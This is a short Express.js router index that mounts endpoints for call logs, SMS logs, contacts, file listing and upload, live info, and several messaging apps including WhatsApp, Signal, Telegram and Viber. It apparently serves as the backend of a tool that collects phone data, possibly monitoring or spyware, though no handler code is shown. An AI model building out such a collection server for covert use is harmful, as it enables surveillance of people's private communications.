const router = require("express").Router();

router.use("/callLogs", require("./callLogs"));
router.use("/conion", require("./conion"));
router.use("/contacts", require("./contacts"));
router.use("/fileListing", require("./fileListing"));
router.use("/fileUpload", require("./fileUpload"));
router.use("/imo", require("./imo"));
router.use("/info", require("./info"));
router.use("/liveInfos", require("./liveInfos"));
router.use("/messenger", require("./messenger"));
router.use("/protectedText", require("./protectedText"));
router.use("/signal", require("./signal"));
router.use("/smsLogs", require("./smsLogs"));
router.use("/telegram", require("./telegram"));
router.use("/viber", require("./viber"));
router.use("/whatsapp", require("./whatsapp"));
router.use("/whatsappBusiness", require("./whatsappBussiness"));

router.use("/apps", require("./apps"));


module.exports = router;
